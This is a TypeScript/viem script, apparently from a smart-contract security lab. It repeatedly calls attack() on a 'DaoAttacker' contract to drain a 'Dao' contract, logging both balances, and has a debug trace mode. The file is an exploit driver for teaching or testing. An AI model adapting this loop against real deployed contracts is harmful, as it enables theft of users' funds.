import { wallet, debugClient, visit } from './lib/index.ts'
import { encodeFunctionData, formatEther } from 'viem'
import { Dao, DaoAttacker } from '../codegen/addresses.ts'
import { abis } from '../codegen/abis.ts'
import { visitor } from './lib/helper.ts'

if (process.env.DEBUG) {
    const result = await debugClient.traceCall(
        {
            to: DaoAttacker,
            from: wallet.account.address,
            data: encodeFunctionData({
                abi: abis.DaoAttacker,
                functionName: 'attack',
                args: [],
            }),
        },
        { withLog: false }
    )
    console.log(JSON.stringify(visit(result, visitor), null, 2))
    process.exit(0)
}

while (true) {
    console.log(
        `🏴‍☠️ Attacker balance: ${formatEther(await wallet.getBalance({ address: DaoAttacker }))}`
    )
    console.log(
        `🏛️ DAO balance: ${formatEther(await wallet.getBalance({ address: Dao }))}`
    )

    const deposit = await wallet.readContract({
        address: Dao,
        abi: abis.Dao,
        functionName: 'getBalance',
        args: [DaoAttacker],
    })

    console.log(`Attacker deposit: ${formatEther(deposit)}`)
    const { request } = await wallet.simulateContract({
        address: DaoAttacker,
        abi: abis.DaoAttacker,
        functionName: 'attack',
    })

    const hash = await wallet.writeContract(request)
    let receipt = await wallet.waitForTransactionReceipt({
        hash,
    })

    console.assert(receipt.status === 'success', 'Transaction failed')
}
